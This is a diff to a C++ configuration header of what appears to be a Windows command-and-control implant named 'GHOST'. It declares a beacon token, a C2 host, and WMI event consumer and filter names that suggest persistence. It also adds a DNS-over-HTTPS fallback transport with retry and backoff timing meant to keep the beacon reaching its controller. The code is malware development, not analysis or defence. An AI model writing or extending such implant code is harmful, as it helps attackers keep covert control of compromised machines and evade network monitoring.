@@ -8,6 +8,10 @@ namespace config {
 
     const wchar_t* GetBeaconToken();
     const wchar_t* GetUserAgent();
+    const wchar_t* GetC2Host();
+    // DoH resolver endpoint for the fallback transport (src/doh.cpp + the
+    // fallback block in src/c2.cpp). Build-time override: -DGHOST_DOH_URL=...
+    const wchar_t* GetDohUrl();
 
     // Beacon timing — values in SECONDS (override at build time:
     // -DGHOST_BEACON_MIN=n -DGHOST_BEACON_MAX=n, or build.sh prompts/env)
@@ -27,6 +31,13 @@ namespace config {
     constexpr uint32_t MAX_FAILURES    = 5;      // failures before the interval holds
     constexpr uint32_t BACKOFF_FACTOR  = 3;      // multiplier per failure step
     constexpr uint32_t BACKOFF_MAX_SEC = 1800;    // absolute ceiling (30 min)
+
+    // DNS-over-HTTPS fallback (src/doh.cpp; policy in src/c2.cpp):
+    //   DOH_IP_TTL_SEC       — how long a literal that has carried a request
+    //                          leads before the hostname path is retried;
+    //   DOH_FAIL_BACKOFF_SEC — minimum gap between failed resolution attempts.
+    constexpr uint32_t DOH_IP_TTL_SEC       = 300;
+    constexpr uint32_t DOH_FAIL_BACKOFF_SEC = 60;
 
     extern const wchar_t* WMI_CONSUMER_NAME;
     extern const wchar_t* WMI_FILTER_NAME;
